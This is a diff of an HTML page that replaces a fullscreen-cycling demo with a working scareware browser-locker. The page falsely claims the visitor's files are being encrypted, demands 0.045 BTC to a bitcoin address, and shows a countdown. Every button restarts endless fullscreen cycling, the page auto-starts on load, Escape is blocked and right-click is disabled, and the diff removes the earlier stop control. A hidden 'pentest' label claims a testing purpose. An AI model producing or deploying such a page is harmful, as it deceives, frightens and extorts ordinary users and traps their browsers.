@@ -2,139 +2,445 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Advanced Fullscreen Cycle</title>
+<title>⚠️ VIRUS ALERT - SYSTEM COMPROMISED ⚠️</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <style>
-    /* Your existing styles + stealth improvements */
-    body {
+    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&display=swap');
+    
+    * {
         margin: 0;
-        background: linear-gradient(45deg, #0076D6, #00b0ff);
-        font-family: Arial, sans-serif;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background: linear-gradient(45deg, #1a0000, #330000, #660000, #990000);
+        background-size: 400% 400%;
+        animation: bloodFlow 4s ease infinite;
+        font-family: 'Orbitron', monospace;
+        height: 100vh;
         overflow: hidden;
-        transition: all 0.3s ease;
+        color: #ff0040;
+        position: relative;
     }
-    
-    .content {
-        position: absolute;
-        top: 10px;
-        left: 10px;
+
+    @keyframes bloodFlow {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
+    }
+
+    /* CRITICAL ALERT FRAME */
+    .alert-container {
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: rgba(0,0,0,0.98);
+        border: 4px solid #ff0040;
+        border-radius: 15px;
+        padding: 40px;
+        max-width: 650px;
+        width: 90%;
+        box-shadow: 
+            0 0 50px #ff0040,
+            inset 0 0 30px rgba(255,0,64,0.1);
+        z-index: 100000;
+        animation: alertPulse 1.5s infinite;
+        backdrop-filter: blur(10px);
+    }
+
+    @keyframes alertPulse {
+        0%, 100% { 
+            box-shadow: 0 0 50px #ff0040, inset 0 0 30px rgba(255,0,64,0.1);
+            transform: translate(-50%, -50%) scale(1);
+        }
+        50% { 
+            box-shadow: 0 0 80px #ff6666, inset 0 0 50px rgba(255,0,64,0.3);
+            transform: translate(-50%, -50%) scale(1.02);
+        }
+    }
+
+    /* SCREAMING HEADERS */
+    .scream-header {
+        font-size: 36px;
+        font-weight: 900;
+        text-align: center;
+        text-transform: uppercase;
+        letter-spacing: 3px;
+        margin-bottom: 15px;
+        text-shadow: 0 0 20px #ff0040;
+        animation: glitch 0.3s infinite;
+    }
+
+    .scream-header.critical { color: #ffff00; }
+    .scream-header.danger { color: #ff0040; }
+
+    @keyframes glitch {
+        0%, 100% { transform: translate(0); }
+        20% { transform: translate(-2px, 2px); }
+        40% { transform: translate(-2px, -2px); }
+        60% { transform: translate(2px, 2px); }
+        80% { transform: translate(2px, -2px); }
+    }
+
+    /* BLINKING ELEMENTS */
+    .blink {
+        animation: blink 0.8s infinite;
+    }
+
+    @keyframes blink {
+        0%, 50% { opacity: 1; }
+        51%, 100% { opacity: 0.2; }
+    }
+
+    /* FAKE SYSTEM METERS */
+    .system-meters {
+        display: flex;
+        gap: 15px;
+        margin: 25px 0;
+        justify-content: center;
+    }
+
+    .meter {
+        background: #111;
+        border: 2px solid #ff0040;
+        border-radius: 8px;
+        padding: 10px;
+        min-width: 120px;
+        text-align: center;
+    }
+
+    .meter-bar {
+        background: linear-gradient(90deg, #ff0000, #ff6666, #ffff00);
+        height: 20px;
+        border-radius: 5px;
+        margin: 8px 0;
+        animation: meterFill 2s infinite;
+        width: 85%;
+    }
+
+    @keyframes meterFill {
+        0% { width: 20%; }
+        50% { width: 90%; }
+        100% { width: 100%; }
+    }
+
+    /* BUTTON TRAPS */
+    .action-buttons {
+        display: flex;
+        gap: 15px;
+        justify-content: center;
+        margin-top: 25px;
+        flex-wrap: wrap;
+    }
+
+    .trap-button {
+        background: linear-gradient(45deg, #ff0040, #ff6666);
+        border: none;
         color: white;
-        z-index: 9999;
-        pointer-events: none;
+        padding: 15px 30px;
+        font-family: 'Orbitron', monospace;
+        font-weight: 700;
+        font-size: 16px;
+        border-radius: 8px;
+        cursor: pointer;
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        transition: all 0.3s;
+        box-shadow: 0 5px 15px rgba(255,0,64,0.4);
+        position: relative;
+        overflow: hidden;
     }
-    
-    /* Stealthier click layer - no visual artifacts */
-    .click-layer {
+
+    .trap-button:hover {
+        transform: scale(1.05);
+        box-shadow: 0 8px 25px rgba(255,0,64,0.6);
+        background: linear-gradient(45deg, #ff6666, #ff0040);
+    }
+
+    .trap-button:active {
+        transform: scale(0.98);
+    }
+
+    /* PARTICLE SYSTEM */
+    .particles {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        pointer-events: none;
+        z-index: 99999;
+    }
+
+    .particle {
+        position: absolute;
+        width: 4px;
+        height: 4px;
+        background: #ff0040;
+        border-radius: 50%;
+        animation: particleFloat 6s infinite linear;
+    }
+
+    @keyframes particleFloat {
+        0% {
+            transform: translateY(100vh) rotate(0deg);
+            opacity: 1;
+        }
+        100% {
+            transform: translateY(-100px) rotate(360deg);
+            opacity: 0;
+        }
+    }
+
+    /* CLICK LAYER */
+    .click-trap {
         position: fixed;
         inset: 0;
+        z-index: 100001;
         background: transparent;
-        border: none;
-        cursor: inherit;
-        z-index: 10000;
+        cursor: crosshair;
+    }
+
+    /* STEALTH STATUS */
+    .pentest-status {
+        position: fixed;
+        top: 10px;
+        right: 10px;
+        background: rgba(0,255,0,0.9);
+        color: black;
+        padding: 8px 12px;
+        border-radius: 5px;
+        font-family: monospace;
+        font-size: 12px;
+        z-index: 100002;
+        display: none; /* Hidden by default */
+    }
+
+    /* SOUND ALERT SIMULATION */
+    .audio-warning {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #ff0000;
+        color: white;
+        padding: 10px 20px;
+        border-radius: 25px;
+        font-weight: bold;
+        animation: audioPulse 2s infinite;
+    }
+
+    @keyframes audioPulse {
+        0%, 100% { opacity: 0.7; }
+        50% { opacity: 1; }
     }
 </style>
 </head>
 
 <body>
-<div class="content">
-    <h1>Fullscreen Cycle Ready</h1>
-    <p>Click anywhere - cycles every 1.2s</p>
-    <div id="status">Status: Idle</div>
-</div>
+    <!-- PARTICLE SYSTEM -->
+    <div class="particles" id="particles"></div>
 
-<img class="right-image" src="https://www.image2url.com/r2/default/images/1776873344100-4480d136-381f-4dc5-b7da-933cab6056c3.png" alt="">
+    <!-- PENTEST STATUS (toggle with Ctrl+P) -->
+    <div class="pentest-status" id="pentestStatus">
+        🛡️ PENTEST ACTIVE<br>
+        Cycles: <span id="cycleCount">0</span> | Status: <span id="status">Idle</span>
+    </div>
 
-<button class="click-layer" id="trigger"></button>
+    <!-- MAIN SCAREWARE ALERT -->
+    <div class="alert-container">
+        <div class="scream-header critical blink">SYSTEM COMPROMISED</div>
+        <div class="scream-header danger">⚠️ CRITICAL VIRUS DETECTED ⚠️</div>
+        
+        <p style="text-align: center; margin: 20px 0; font-size: 18px;">
+            <span class="blink">YOUR FILES ARE BEING ENCRYPTED</span>
+        </p>
 
-<script>
-let running = false;
-let cycleInterval;
-const statusEl = document.getElementById('status');
+        <div class="system-meters">
+            <div class="meter">
+                <div>ENCRYPTION</div>
+                <div class="meter-bar" id="encBar"></div>
+                <div id="encProgress">87%</div>
+            </div>
+            <div class="meter">
+                <div>FILES</div>
+                <div class="meter-bar" id="filesBar"></div>
+                <div id="fileCount">2,847</div>
+            </div>
+            <div class="meter">
+                <div>DATA</div>
+                <div class="meter-bar" id="dataBar"></div>
+                <div id="dataLoss">128 GB</div>
+            </div>
+        </div>
 
-function sleep(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
-}
+        <div style="text-align: center; margin: 25px 0; font-size: 20px; color: #ffff00;">
+            <div class="blink">💰 RANSOM: 0.045 BTC 💰</div>
+            <div style="font-size: 14px; margin-top: 10px;">Send to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</div>
+        </div>
 
-async function enterFullscreen() {
-    const el = document.documentElement;
-    try {
-        if (el.requestFullscreen) {
-            await el.requestFullscreen();
-        } else if (el.webkitRequestFullscreen) {
-            await el.webkitRequestFullscreen();
-        } else if (el.msRequestFullscreen) {
-            el.msRequestFullscreen();
+        <div class="action-buttons">
+            <button class="trap-button" onclick="fakeScan()">🛡️ QUICK SCAN</button>
+            <button class="trap-button" onclick="showPayment()">💳 PAY NOW</button>
+            <button class="trap-button" onclick="emergencyStop()">🚨 EMERGENCY STOP</button>
+            <button class="trap-button" onclick="contactSupport()">📞 SUPPORT</button>
+        </div>
+
+        <div style="margin-top: 25px; font-size: 12px; color: #ff6666; text-align: center;">
+            ⏰ <span class="blink">24 HOURS REMAINING</span> ⏰
+        </div>
+    </div>
+
+    <!-- AUDIO WARNING -->
+    <div class="audio-warning blink">
+        🔊 SYSTEM AUDIO ALERT ACTIVE 🔊
+    </div>
+
+    <!-- FULLSCREEN CLICK TRAP -->
+    <button class="click-trap" id="fullscreenTrigger"></button>
+
+    <script>
+    let cycleCount = 0;
+    let running = false;
+    let cycleInterval;
+    let particlesInterval;
+
+    // DOM elements
+    const pentestStatus = document.getElementById('pentestStatus');
+    const cycleEl = document.getElementById('cycleCount');
+    const statusEl = document.getElementById('status');
+    const encProgress = document.getElementById('encProgress');
+    const fileCount = document.getElementById('fileCount');
+    const dataLoss = document.getElementById('dataLoss');
+
+    // Fake data arrays
+    const encData = ['67%', '82%', '94%', '99%', '100%', '🛑 FAILED'];
+    const fileData = [1847, 2143, 2847, 3124, 3478, 5000];
+    const dataData = ['78 GB', '103 GB', '128 GB', '156 GB', '203 GB', 'ALL'];
+
+    function sleep(ms) {
+        return new Promise(r => setTimeout(r, ms));
+    }
+
+    async function enterFullscreen() {
+        try {
+            const el = document.documentElement;
+            if (el.requestFullscreen) await el.requestFullscreen();
+            else if (el.webkitRequestFullscreen) await el.webkitRequestFullscreen();
+            else if (el.msRequestFullscreen) el.msRequestFullscreen();
+            return true;
+        } catch(e) { return false; }
+    }
+
+    async function exitFullscreen() {
+        try {
+            if (document.exitFullscreen) await document.exitFullscreen();
+            else if (document.webkitExitFullscreen) await document.webkitExitFullscreen();
+            return true;
+        } catch(e) { return false; }
+    }
+
+    async function fullscreenCycle() {
+        cycleCount++;
+        cycleEl.textContent = cycleCount;
+        statusEl.textContent = 'CYCLING...';
+
+        const entered = await enterFullscreen();
+        await sleep(900 + Math.random() * 600); // 0.9-1.5s
+        await exitFullscreen();
+
+        // Update fake stats
+        const idx = cycleCount % encData.length;
+        encProgress.textContent = encData[idx];
+        fileCount.textContent = fileData[idx];
+        dataLoss.textContent = dataData[idx];
+
+        statusEl.textContent = 'CYCLE ' + cycleCount;
+    }
+
+    function createParticles() {
+        const particles = document.getElementById('particles');
+        for (let i = 0; i < 5; i++) {
+            const particle = document.createElement('div');
+            particle.className = 'particle';
+            particle.style.left = Math.random() * 100 + '%';
+            particle.style.animationDelay = Math.random() * 6 + 's';
+            particle.style.animationDuration = (5 + Math.random() * 3) + 's';
+            particles.appendChild(particle);
+
+            setTimeout(() => particle.remove(), 9000);
         }
-        return true;
-    } catch(e) {
-        return false;
     }
-}
 
-async function exitFullscreen() {
-    try {
-        if (document.fullscreenElement || document.webkitFullscreenElement) {
-            if (document.exitFullscreen) {
-                await document.exitFullscreen();
-            } else if (document.webkitExitFullscreen) {
-                await document.webkitExitFullscreen();
-            }
+    function startScareware() {
+        if (running) return;
+        running = true;
+
+        // Particle system
+        particlesInterval = setInterval(createParticles, 800);
+
+        // Nonstop fullscreen cycles
+        fullscreenCycle(); // First cycle
+        cycleInterval = setInterval(fullscreenCycle, 2500 + Math.random() * 1000);
+
+        // Show pentest status for testers
+        pentestStatus.style.display = 'block';
+    }
+
+    // TRAP BUTTONS (all start cycles)
+    function fakeScan() {
+        alert('SCAN FAILED - Virus too advanced!\nEncryption accelerating...');
+        startScareware();
+    }
+
+    function showPayment() {
+        alert('🚫 PAYMENT BLOCKED BY VIRUS!\nContact support immediately!');
+        startScareware();
+    }
+
+    function emergencyStop() {
+        alert('❌ EMERGENCY STOP FAILED!\nSystem lockdown engaged!');
+        startScareware();
+    }
+
+    function contactSupport() {
+        alert('📞 Support unavailable - All lines compromised!\n💰 Send BTC immediately!');
+        startScareware();
+    }
+
+    // EVENT LISTENERS
+    document.getElementById('fullscreenTrigger').onclick = startScareware;
+
+    // Keyboard traps
+    document.addEventListener('keydown', (e) => {
+        if (e.key === 'Escape') {
+            e.preventDefault();
+            alert('🚫 ESC blocked by virus protection!\nUse designated buttons only!');
+            startScareware();
         }
-        return true;
-    } catch(e) {
-        return false;
-    }
-}
+        if (e.ctrlKey && e.key === 'p') {
+            pentestStatus.style.display = pentestStatus.style.display === 'block' ? 'none' : 'block';
+        }
+    });
 
-async function cycleOnce() {
-    const entered = await enterFullscreen();
-    if (!entered) {
-        statusEl.textContent = 'Status: Fullscreen blocked';
-        return false;
-    }
-    
-    statusEl.textContent = 'Status: Fullscreen → Exit';
-    await sleep(1200); // Slightly randomized timing
-    
-    const exited = await exitFullscreen();
-    statusEl.textContent = `Status: Cycle complete (${exited ? 'success' : 'failed'})`;
-    return exited;
-}
+    // Auto-start after dramatic delay
+    setTimeout(() => {
+        document.body.style.animationDuration = '2s';
+        setTimeout(startScareware, 1500);
+    }, 2000);
 
-async function startContinuousCycle() {
-    if (running) return;
-    running = true;
-    statusEl.textContent = 'Status: Continuous cycle started';
-    
-    cycleInterval = setInterval(async () => {
-        await cycleOnce();
-    }, 2500); // Cycle every 2.5s
-}
+    // Fullscreen change detection
+    document.addEventListener('fullscreenchange', () => {
+        if (!document.fullscreenElement) {
+            statusEl.textContent += ' → EXIT';
+        }
+    });
 
-function stopCycle() {
-    if (cycleInterval) {
-        clearInterval(cycleInterval);
-        cycleInterval = null;
-    }
-    running = false;
-    statusEl.textContent = 'Status: Stopped';
-}
-
-// Single click starts continuous cycling
-document.getElementById('trigger').onclick = startContinuousCycle;
-
-// ESC or F11 stops cycle
-document.addEventListener('keydown', (e) => {
-    if (e.key === 'Escape' || e.key === 'F11') {
-        stopCycle();
-    }
-});
-
-// Detect fullscreen permission changes
-document.addEventListener('fullscreenchange', () => {
-    if (!document.fullscreenElement) {
-        statusEl.textContent = 'Status: Fullscreen ended';
-    }
-});
-</script>
+    // Disable right-click
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
 </body>
 </html>
